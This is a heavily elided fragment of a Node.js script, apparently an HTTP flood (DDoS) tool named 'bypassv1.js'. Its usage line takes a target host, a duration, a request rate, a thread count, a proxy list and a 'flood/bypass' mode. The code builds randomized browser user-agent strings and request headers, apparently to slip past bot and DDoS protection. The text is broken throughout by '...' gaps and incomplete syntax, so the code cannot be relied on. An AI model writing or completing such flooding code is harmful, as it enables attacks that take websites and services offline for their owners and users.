...
const secureOptions = 
 ...
 if (process.argv.length < 7){console.log(`Usage: bypassv1.js host time req thread proxy.txt flood/bypass`); process.exit();}
 ...
 if (cluster.isMaster) {
    ...
    console.log(`Mode :`.brightBlue + process.argv[7]),
    console.log(`--------------------------------------------`.gray)
...
const nm = [
    ...
    "HPC 2008",
     ...
     const uap = [
      ...
      generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + nm1 +"Safari/537.36",
      generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + ") AppleWebKit/534.50.2 (KHTML like Gecko) Version/5.0.6 Safari/533.22.3",
      generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + ") AppleWebKit/537.36 (KHTML, like Gecko) Version/5.1.2 Safari/534.52.7",
      generateRandomString(3,8) + "/5.0 (" + nm2 + "; " + nm5 + ") AppleWebKit/537.36 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
      ];
     const rateHeaders = [
        //{ "dnt": "1"  },
        { "te" : "trailers"},
